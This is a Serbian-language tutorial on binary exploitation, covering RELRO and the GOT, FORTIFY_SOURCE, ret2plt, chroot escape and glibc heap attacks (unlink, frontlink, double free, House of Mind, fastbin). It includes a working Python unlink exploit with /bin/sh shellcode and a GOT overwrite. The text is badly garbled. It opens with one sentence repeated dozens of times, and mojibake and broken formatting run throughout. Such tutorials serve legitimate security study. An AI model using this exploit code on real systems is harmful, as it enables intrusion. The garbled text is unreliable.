Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da ovo bude prepreka je spreƒçavanje **pisanja** u njih. Najƒçe≈°ƒái naƒçin na koji sam video da
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Bez relro:
```bash
gef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef‚û§  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
0x404018 - 0x404030  ‚Üí   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Za binarni **bez relro**, mo≈æemo videti da je adresa unosa `got` za `fgets` `0x404018`. Pogledom na mapiranje memorije vidimo da se nalazi izmeƒëu `0x404000` i `0x405000`, ≈°to ima **dozvole `rw`**, ≈°to znaƒçi da mo≈æemo ƒçitati i pisati u nju. Za binarni **sa relro**, vidimo da je adresa tabele `got` za izvr≈°avanje binarnog fajla (pie je omoguƒáen pa ƒáe se ova adresa promeniti) `0x555555557fd0`. U mapiranju memorije tog binarnog fajla nalazi se izmeƒëu `0x0000555555557000` i `0x0000555555558000`, ≈°to ima memoriju **dozvole `r`**, ≈°to znaƒçi da mo≈æemo samo ƒçitati iz nje.

Dakle, ≈°ta je **bypass**? Tipiƒçan naƒçin zaobila≈æenja koji koristim je jednostavno ne pisati u memorijske regione koje relro ƒçini samo za ƒçitanje, i **pronaƒái drugi naƒçin za izvr≈°avanje koda**.

Imajte na umu da bi se ovo desilo, binarni fajl mora unapred znati adrese funkcija:

* Lenje povezivanje: Adresa funkcije se tra≈æi prvi put kada se funkcija pozove. Dakle, GOT mora imati dozvole za pisanje tokom izvr≈°avanja.
* Pove≈æi sada: Adrese funkcija se re≈°avaju na poƒçetku izvr≈°avanja, zatim se daju dozvole samo za ƒçitanje osetljivim sekcijama poput .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

Da biste proverili da li program koristi Pove≈æi sada, mo≈æete uraditi:
```bash
readelf -l /proc/ID_PROC/exe | grep BIND_NOW
```
Kada se binarni fajl uƒçita u memoriju i funkcija se pozove prvi put, skoƒçi se na PLT (Procedure Linkage Table), odakle se vr≈°i skok (jmp) na GOT i otkriva da ta unosa nije re≈°ena (sadr≈æi sledeƒáu adresu iz PLT). Zatim se poziva Runtime Linker ili rtfd da re≈°i adresu i saƒçuva je u GOT.

Kada se poziva funkcija, poziva se PLT, koja ima adresu GOT gde je sme≈°tena adresa funkcije, tako da preusmerava tok tamo i poziva funkciju. Meƒëutim, ako je prvi put pozvana funkcija, ono ≈°to se nalazi u GOT-u je sledeƒáa instrukcija iz PLT-a, pa tok sledi kod PLT-a (rtfd) i saznaje adresu funkcije, ƒçuva je u GOT-u i poziva.

Prilikom uƒçitavanja binarnog fajla u memoriju, kompajler mu je rekao na kojem offsetu treba da postavi podatke koji se moraju uƒçitati prilikom pokretanja programa.

Leno povezivanje ‚Äî> Adresa funkcije se tra≈æi prvi put kada se pozove ta funkcija, tako da GOT ima dozvole za pisanje kako bi se adresa saƒçuvala tamo kada se tra≈æi, i ne mora ponovo da se tra≈æi.

Ve≈æi sada ‚Äî> Adrese funkcija se tra≈æe prilikom uƒçitavanja programa i menja se dozvola sekcija .got, .dtors, .ctors, .dynamic, .jcr u samo ƒçitanje. **-z relro** i **-z now**

Ipak, opƒáenito programi nisu komplikovani s tim opcijama, pa su ovi napadi i dalje moguƒái.

**readelf -l /proc/ID\_PROC/exe | grep BIND\_NOW** ‚Äî> Da biste saznali da li koriste BIND NOW

**Fortify Source -D\_FORTIFY\_SOURCE=1 ili =2**

Poku≈°ava identifikovati funkcije koje kopiraju podatke sa jednog mesta na drugo na nesiguran naƒçin i zameniti funkciju sigurnom funkcijom.

Na primer:\
char buf\[16];\
strcpy(but, source);

Identifikuje je kao nesigurnu i zatim zamenjuje strcpy() sa \_\_strcpy\_chk() koristeƒái veliƒçinu bafera kao maksimalnu veliƒçinu za kopiranje.

Razlika izmeƒëu **=1** i **=2** je:

Druga ne dozvoljava da **%n** dolazi iz sekcije sa dozvolama za pisanje. Takoƒëe, parametar za direktni pristup argumentima mo≈æe se koristiti samo ako su kori≈°ƒáeni prethodni, tj. mo≈æe se koristiti samo **%3$d** ako su prethodno kori≈°ƒáeni **%2$d** i **%1$d**

Za prikazivanje poruke o gre≈°ci koristi se argv\[0\], pa ako se postavi adresa druge lokacije (kao globalna promenljiva) u nju, poruka o gre≈°ci ƒáe prikazati sadr≈æaj te promenljive. Str. 191

**Zamena Libsafe**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Pozivi nekih nesigurnih funkcija se zamenjuju sigurnijim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statiƒçke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne radi na binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se od uƒçitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. Meƒëutim, ovo zapravo ne zaustavlja skoro nijedan napad, a posebno ne u little endian sistemu.

**ret2plt**

Sastoji se od izvoƒëenja ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri se ka unosi u GOT-u i kopira prvi bajt funkcije koja se ≈æeli pozvati (system()). Zatim se isto radi usmeravajuƒái se ka GOT+1 i kopira se 2. bajt system()... Na kraju se poziva adresa saƒçuvana u GOT-u koja ƒáe biti system()

**La≈æni EBP**

Za funkcije koje koriste EBP kao registar za upuƒáivanje argumenata, prilikom modifikacije EIP-a i upuƒáivanja na system(), takoƒëe se mora modifikovati EBP da upuƒáuje na memorijsku lokaciju koja ima 2 proizvoljna bajta, a zatim na adresu &‚Äù/bin/sh‚Äù.

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instalira osnovni sistem u odreƒëeni poddirektorijum

Administrator mo≈æe izaƒái iz ovih kaveza koristeƒái: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind ‚Äî> Tra≈æi gre≈°ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Heap Overflow: Osnovni eksploiti**

**Dodeljeni blok**

prev\_size |\
size | ‚ÄîZaglavlje\
\*mem | Podaci

**Slobodan blok**

prev\_size |\
size |\
\*fd | Ptr naprednog bloka\
\*bk | Ptr nazadnog bloka ‚ÄîZaglavlje\
\*mem | Podaci

Slobodni blokovi su u dvostruko povezanoj listi (bin) i nikada ne smeju postojati dva slobodna bloka zajedno (spajaju se)

U "size" postoje bitovi koji pokazuju: Da li je prethodni blok u upotrebi, da li je blok dodeljen putem mmap() i da li blok pripada primarnoj areni.

Ako se oslobodi blok i neki od susednih blokova je slobodan, oni se spajaju pomoƒáu makroa unlink() i novi, veƒái blok se prosleƒëuje frontlink() da ga ubaci u odgovarajuƒái bin.

unlink(){\
BK = P->bk; ‚Äî> BK novog bloka je onaj koji je imao prethodno slobodan blok\
FD = P->fd; ‚Äî> FD novog bloka je onaj koji je imao prethodno slobodan blok\
FD->bk = BK; ‚Äî> BK sledeƒáeg bloka pokazuje na novi blok\
BK->fd = FD; ‚Äî> FD prethodnog bloka pokazuje na novi blok\
}

Dakle, ako uspemo da promenimo P->bk sa adresom shell koda i P->fd sa adresom unosa u GOT ili DTORS manje 12, posti≈æe se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se izvr≈°ava shell kod prilikom izlaska iz programa.

Takoƒëe, 4. izjava unlink() pi≈°e ne≈°to i shell kod mora biti prilagoƒëen za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Ovo uzrokuje pisanje 4 bajta od 8. bajta shell koda, tako da prva instrukcija shell koda mora biti skok kako bi preskoƒçila ovo i pre≈°la na nops koji vode do ostatka shell koda.

Stoga se eksploit kreira:

U bafer1 ubacujemo shell kod poƒçev≈°i od skoka kako bi pre≈°ao na nops ili na ostatak shell koda.

Nakon shell koda ubacujemo punjenje dok ne doƒëemo do polja prev\_size i size sledeƒáeg bloka. Na ovim mestima ubacujemo 0xfffffff0 (tako da se prev\_size prepisuje da ima bit koji ka≈æe da je slobodan) i ‚Äú-4‚Äú(0xfffffffc) u size (da bi prilikom provere u 3. bloku da li je 2. bio slobodan zapravo oti≈°ao na modifikovan prev\_size koji ƒáe reƒái da je slobodan) -> Tako kada free() istra≈æuje, iƒái ƒáe na size 3. ali ƒáe zapravo iƒái na 2. - 4 i misliƒáe da je 2. blok slobodan. Tada ƒáe pozvati **unlink()**.

Pozivom unlink() koristiƒáe kao P->fd prve podatke 2. bloka, pa ƒáe tamo biti ubaƒçena adresa koju ≈æelite da prepi≈°ete - 12 (jer ƒáe u FD->bk dodati 12 adresi saƒçuvanoj u FD). I na toj adresi ƒáe se uneti druga adresa koja se nalazi u 2. bloku, koja ƒáe biti adresa shell koda (la≈æni P->bk).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**
**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Bit koji oznaƒçava da je prethodni komad slobodan treba biti postavljen na 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, kako bi se mislilo da je "size" treƒáeg komada 4 bajta unazad (ukazuje na prev\_size) jer se tu proverava da li je drugi komad slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #Na poƒçetku payloada dodajemo 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biƒáe prebrisana kako bi se shellcode pokrenula drugi put kada se free pozove)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kao ≈°to je reƒçeno, payload poƒçinje sa 8 bajtova punjenja**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Modifikujemo drugi komad, got\_free pokazuje gde ƒáemo saƒçuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaƒëanje u obrnutom redosledu (wargame)**

Kontroli≈°emo 3 uzastopna chunk-a koji se oslobaƒëaju u obrnutom redosledu od rezervacije.

U tom sluƒçaju:

U chunk-u c stavljamo shellcode

Chunk a koristimo da prepi≈°emo b tako da size ima deaktiviran bit PREV\_INUSE, tako da misli da je chunk a slobodan.

Takoƒëe, u zaglavlju b prepi≈°emo size da bude -4.

Tada ƒáe program misliti da je "a" slobodan i u binu, pa ƒáe pozvati unlink() da ga odve≈æe. Meƒëutim, po≈°to je PREV\_SIZE u zaglavlju -4, misliƒáe da chunk "a" zapravo poƒçinje na b+4. Drugim reƒçima, pozvaƒáe unlink() na chunk koji poƒçinje na b+4, pa ƒáe na b+12 biti pokazivaƒç "fd", a na b+16 pokazivaƒç "bk".

Na taj naƒçin, ako stavimo adresu shellcode u bk i adresu funkcije "puts()" -12 u fd, imamo na≈° payload.

**Tehnika Frontlink**

Poziva se frontlink kada se ne≈°to oslobodi, a nijedan od susednih chunk-ova nije slobodan, umesto pozivanja unlink(), direktno se poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboƒëen (free()).

Potrebno je:

Buffer koji mo≈æe biti preplavljen funkcijom unos podataka

Buffer koji je susedan ovom koji treba biti osloboƒëen i ƒçije ƒáe se polje fd u zaglavlju promeniti zbog preplavljivanja prethodnog bafera

Buffer koji treba osloboditi sa veliƒçinom veƒáom od 512, ali manjom od prethodnog bafera

Buffer deklarisan pre koraka 3 koji omoguƒáava prepisivanje prev\_size ovog bafera

Na ovaj naƒçin, preplavljujuƒái dva malloc-a na nekontrolisan naƒçin i jedan na kontrolisan naƒçin koji se oslobaƒëa samo jednom, mo≈æemo izvr≈°iti eksploataciju.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaƒçem, dva bin-a pokazuju na istu adresu.

Ako se ≈æeli ponovo koristiti jedan, to se mo≈æe lako uraditi. Ako se ≈æeli koristiti drugi, dodeliƒáe se isti prostor, pa ƒáemo imati pokazivaƒçe "fd" i "bk" sa la≈ænim podacima koje ƒáe upisati prethodna rezervacija.

**After free()**

Prethodno osloboƒëeni pokazivaƒç se ponovo koristi bez kontrole.

## **8 Heap Overflows: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Potrebno je samo jedno pozivanje free() da bi se izazvalo izvr≈°avanje proizvoljnog koda. Potrebno je pronaƒái drugi chunk koji mo≈æe biti preplavljen od strane prethodnog i osloboƒëen.

Pozivanje free() dovodi do poziva public\_fREe(mem), ≈°to radi:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Vraƒáa pokazivaƒç na adresu na kojoj poƒçinje chunk (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava se polje size bit NON\_MAIN\_ARENA, koje se mo≈æe promeniti da bi provera vratila taƒçno i izvr≈°ila heap\_for\_ptr() koja vr≈°i and na "mem" ostavljajuƒái 0 poslednjih 2.5 bajta (u na≈°em sluƒçaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struktura heap\_info)

Na ovaj naƒçin, ako mo≈æemo kontrolisati chunk na primeru 0x0804a000 i treba osloboditi chunk na **0x081002a0** mo≈æemo doƒái do adrese 0x08100000 i upisati ≈°ta god ≈æelimo, na primer **0x0804a000**. Kada se ovaj drugi chunk oslobodi, heap\_for\_ptr(ptr)->ar\_ptr ƒáe vratiti ono ≈°to smo upisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaƒçi vrednost prvih 4 bajta, ar\_ptr)

Na taj naƒçin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao ≈°to smo videli ranije, mo≈æemo kontrolisati vrednost av, jer je to ono ≈°to pi≈°emo u chunk koji ƒáe se osloboditi.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Dakle, ako u av->bins\[2] upi≈°emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji ƒáe se upisati u \_\_DTOR\_END\_\_ adresa drugog chunk-a.

Drugim reƒçima, u prvom chunk-u na poƒçetku treba staviti adresu \_\_DTOR\_END\_\_-12 mnogo puta jer ƒáe av->bins\[2] to izvuƒái

Na adresi na koju padne adresa drugog chunk-a sa poslednjih 5 nula treba upisati adresu ovog prvog chunk-a kako bi heap\_for\_ptr() mislio da je ar\_ptr na poƒçetku prvog chunk-a i izvukao av->bins\[2] odatle

U drugom chunk-u, zahvaljujuƒái prvom, prepisujemo prev\_size sa jump 0x0c i size sa neƒçim da aktivira -> NON\_MAIN\_ARENA

Zatim u drugom chunk-u stavljamo gomilu nops i na kraju shellcode

Na taj naƒçin ƒáe se pozvati \_int\_free(TROZO1, TROZO2) i pratiti instrukcije za upisivanje u \_\_DTOR\_END\_\_ adresu prev\_size TROZO2 koji ƒáe skoƒçiti na shellcode.

Za primenu ove tehnike potrebno je da se ispune jo≈° neki zahtevi koji malo komplikuju payload.
Ova tehnika vi≈°e nije primenjiva jer je gotovo isti zakrpa primenjen kao i za unlink. Uporeƒëuju se da li novi sajt na koji se pokazuje takoƒëe pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvr≈°avanje sledeƒáeg koda do kojeg se dolazi nakon prvog provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Gde je fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Na ovaj naƒçin, ako se postavi u "fb", daje adresu funkcije u GOT-u, na ovu adresu ƒáe se postaviti adresa prebrisana. Za ovo ƒáe biti potrebno da je arena blizu adresa dtors. Taƒçnije, av->max\_fast treba da bude na adresi koju ƒáemo prebrisati.

S obzirom da smo sa The House of Mind videli da mi kontroli≈°emo poziciju av.

Zato, ako u polje size stavimo veliƒçinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ƒáe nam vratiti fastbins\[-1], koji ƒáe pokazivati na av->max\_fast

U ovom sluƒçaju av->max\_fast ƒáe biti adresa koja ƒáe biti prebrisana (ne na koju pokazuje, veƒá ta pozicija ƒáe biti prebrisana).

Takoƒëe, mora se ispuniti uslov da susedni deo osloboƒëenog dela bude veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog dela 8, u ovom la≈ænom delu samo treba staviti veliƒçinu veƒáu od 8 (kako ƒáe shellcode biti u osloboƒëenom delu, treba staviti na poƒçetak jmp koji ƒáe pasti na nops).

Takoƒëe, isti la≈æni deo mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula iz \_DTOR\_END\_ i malog broja adresa u GOT-u, nijedna adresa iz ovih sekcija nije pogodna za prebrisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

Jo≈° jedan naƒçin napada je preusmeravanje **av** ka steku.

Ako promenimo veliƒçinu da bude 16 umesto 8, tada: fastbin\_index() ƒáe nam vratiti fastbins\[0] i mo≈æemo koristiti ovo da prepi≈°emo stek.

Za ovo ne sme biti nikakvih canary vrednosti ili ƒçudnih vrednosti na steku, zapravo moramo biti u ovom sluƒçaju: 4 bajta nula + EBP + RET

Potrebna su nam 4 bajta nula kako bi **av** bio na ovoj adresi i prvi element **av** je mutex koji mora biti 0.

